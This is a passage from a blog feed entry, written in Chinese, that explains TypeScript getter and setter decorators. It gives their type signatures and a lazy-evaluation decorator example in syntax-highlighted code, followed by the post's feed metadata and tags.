class="line"></span><br><span class="line"><span class="keyword">const</span> color = <span class="keyword">new</span> <span class="title class_">Color</span>();</span><br><span class="line"><span class="comment">// &quot;[DEBUG] initializing name with value green&quot;</span></span><br></pre></td></tr></table></figure><h3 id="5-2-4-getter-装饰器、setter-装饰器"><a href="#5-2-4-getter-装饰器、setter-装饰器" class="headerlink" title="5.2.4 getter 装饰器、setter 装饰器"></a>5.2.4 getter 装饰器、setter 装饰器</h3><p>它们是 <code>context.kind</code> 字段为 <code>&quot;getter&quot;/&quot;setter&quot;</code> 的装饰器，是<strong>专门用来装饰类访问器</strong>的装饰器。</p><p>描述如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">ClassGetterDecorator</span> = <span class="function">(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">  value: <span class="built_in">Function</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  context: &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    kind: <span class="string">&quot;getter&quot;</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    name: <span class="built_in">string</span> | <span class="built_in">symbol</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">static</span>: <span class="built_in">boolean</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">private</span>: <span class="built_in">boolean</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    access: &#123; get: () =&gt; <span class="built_in">unknown</span> &#125;;</span></span></span><br><span class="line"><span class="params"><span class="function">    addInitializer(initializer: () =&gt; <span class="built_in">void</span>): <span class="built_in">void</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">  &#125;</span></span></span><br><span class="line"><span class="params"><span class="function"></span>) =&gt;</span> <span class="title class_">Function</span> | <span class="built_in">void</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">ClassSetterDecorator</span> = <span class="function">(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">  value: <span class="built_in">Function</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  context: &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    kind: <span class="string">&quot;setter&quot;</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    name: <span class="built_in">string</span> | <span class="built_in">symbol</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">static</span>: <span class="built_in">boolean</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">private</span>: <span class="built_in">boolean</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    access: &#123; set: (value: <span class="built_in">unknown</span>) =&gt; <span class="built_in">void</span> &#125;;</span></span></span><br><span class="line"><span class="params"><span class="function">    addInitializer(initializer: () =&gt; <span class="built_in">void</span>): <span class="built_in">void</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">  &#125;</span></span></span><br><span class="line"><span class="params"><span class="function"></span>) =&gt;</span> <span class="title class_">Function</span> | <span class="built_in">void</span>;</span><br></pre></td></tr></table></figure><p>这两个装饰器要么不返回值，要么返回一个函数，取代原来的取值器或存值器。</p><p>为什么要对访问器进行装饰？比如懒加载的特性：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> &#123;</span><br><span class="line">  <span class="meta">@lazy</span></span><br><span class="line">  <span class="keyword">get</span> <span class="title function_">value</span>() &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Calculating...&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Time Consuming Result&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">lazy</span>(<span class="params">value: <span class="built_in">any</span>, &#123; kind, name &#125;: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (kind === <span class="string">&quot;getter&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"><span class="variable language_">this</span>: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> result = value.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">      <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="variable language_">this</span>, name, &#123;</span><br><span class="line">        <span class="attr">value</span>: result,</span><br><span class="line">        <span class="attr">writable</span>: <span class="literal">false</span>,</span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> inst = <span class="keyword">new</span> <span class="title function_">C</span>();</span><br><span class="line">inst.<span class="property">value</span>;</span><br><span class="line"><span class="comment">// Calculating...</span></span><br><span class="line"><span class="comment">// &#x27;Time Consuming Result&#x27;</span></span><br><span class="line">inst.<span class="property">value</span>;</span><br><span class="line"><span class="comment">// &#x27;Time Consuming Result&#x27;</span></span><br></pre></td></tr></table></figure><hr><p>还有一个 <code>accessor</code> 装饰器不常用，在这里不再赘述，有兴趣请查看官方文档。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;i&gt;Written by SJTU-XHW&lt;/i&gt;&lt;/p&gt;
&lt;p&gt;&lt;i&gt;Reference: &lt;/i&gt; MDN Doc &amp;amp;&amp;amp; TypeScript Doc&lt;/p&gt;
&lt;p&gt;&lt;i&gt;本人学识有限，笔记难免有错，恳请读者能够批评指正，本人将不胜感激！&lt;/i&gt;&lt;/p&gt;
&lt;hr&gt;</summary>
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="Web" scheme="https://blog.sjtuxhw.top/tags/Web/"/>
    
    <category term="JavaScript" scheme="https://blog.sjtuxhw.top/tags/JavaScript/"/>
    
    <category term="TypeScript" scheme="https://blog.sjtuxhw.top/tags/TypeScript/"/>
    
  </entry>
  
</feed>
